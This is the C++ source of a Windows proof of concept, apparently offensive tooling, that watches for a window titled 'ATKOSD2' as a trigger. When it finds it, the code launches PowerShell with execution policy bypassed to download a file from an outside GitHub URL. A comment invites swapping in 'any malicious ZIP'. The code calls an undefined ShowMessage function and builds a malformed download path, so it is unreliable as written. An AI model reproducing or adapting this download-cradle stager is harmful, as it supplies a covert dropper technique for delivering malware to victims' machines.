

//This is a simple proof of concept for processing command lines via Get & Set Window APIs. One can rename WINDOW names to certain content and let them execute the content. This POC contains the demo using CreateProcess + Powershell download.
//Author: ElementalX
//This code has been enhanced using the GPT Model.

#include <windows.h>
#include <string>
#include <iostream>
#include <sstream>


bool CreateNewProcess(const std::string& applicationPath, const std::string& commandLineArgs) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    
    std::string fullCommandLine = "\"" + applicationPath + "\" " + commandLineArgs;

   
    if (fullCommandLine.length() >= 1024) {
        ShowMessage("Command line too long.", "Error", MB_ICONERROR);
        return false;
    }

    char cmdLineMutable[1024];
    strncpy_s(cmdLineMutable, fullCommandLine.c_str(), sizeof(cmdLineMutable));

    if (!CreateProcessA(
        NULL,               // Application name (NULL since it's included in command line)
        cmdLineMutable,     // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        0,                  // No creation flags
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi)) {             // Pointer to PROCESS_INFORMATION structure
        DWORD error = GetLastError();
        std::ostringstream oss;
        oss << "Failed to create process. Error: " << error;
        ShowMessage(oss.str().c_str(), "Process Creation Error", MB_ICONERROR);
        return false;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

// Callback function for enumerating all top-level windows
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowTitle[256];
    if (GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle)) > 0) {
        // Check if the window title matches "ATKOSDN : https://www.google.com/search?client=firefox-b-d&q=ATKOSD2"
        if (strcmp(windowTitle, "ATKOSD2") == 0) {
            // Change the window name to "powershell.exe"
            if (SetWindowTextA(hwnd, "powershell.exe")) {
                // Define the full path to powershell.exe
                std::string powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

                // Define the PowerShell command to download the file
                // Raw URL of the file to download, I am downloading a simple rust src code you can download any malicious ZIP or some stuff
                std::string downloadUrl = "https://raw.githubusercontent.com/xelemental/R-utils/main/falsebinary/src/main.rs";
                std::string destinationPath = "C:\\Users\\\\Downloads\\main.rs";
                std::string destinationDir = "C:\\Users\\Downloads";
                std::string createDirCommand = "New-Item -ItemType Directory -Path \"" + destinationDir + "\" -Force";
                std::string downloadCommand = "Invoke-WebRequest -Uri \"" + downloadUrl + "\" -OutFile \"" + destinationPath + "\" -UseBasicParsing";
                std::string combinedCommand = "-NoProfile -ExecutionPolicy Bypass -Command \"" +
                    createDirCommand + "; " + downloadCommand + "\"";

                if (!CreateNewProcess(powershellPath, combinedCommand)) {
                  
                }
                else {
                }
            }
            else {
                DWORD error = GetLastError();
                std::ostringstream oss;
                oss << "Failed to change window name. Error: " << error;
                ShowMessage(oss.str().c_str(), "Error", MB_ICONERROR);
            }

            return FALSE; 
        }
    }
    return TRUE; 
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Enumerate all top-level windows
    if (!EnumWindows(EnumWindowsProc, 0)) {
        DWORD error = GetLastError();
        std::ostringstream oss;
        oss << "Failed to enumerate windows. Error: " << error;
        ShowMessage(oss.str().c_str(), "Enumeration Error", MB_ICONERROR);
        return 1;
    }

    ShowMessage("Enumeration completed. Target window not found.", "Info", MB_ICONINFORMATION);
    return 0;
}
